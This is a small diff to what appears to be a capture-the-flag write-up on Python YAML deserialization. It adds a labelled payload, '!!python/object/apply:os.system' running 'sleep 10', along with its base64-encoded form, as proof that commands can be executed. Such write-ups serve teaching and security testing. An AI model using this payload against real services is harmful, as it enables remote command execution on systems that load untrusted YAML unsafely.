@@ -82,7 +82,9 @@ Now, if we do some research on the internet we find that pythons yaml allows ins
 After some more research we can than finally construct the following payload.
 
 ```
-yaml: !!python/object/apply:os.system ["sleep 10"]
+payload: yaml: !!python/object/apply:os.system ["sleep 10"]
+encoded payload: eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbInNsZWVwIDEwIl0=
+
 ```
 
 with this payload we perform an system command which initiates a sleep command.
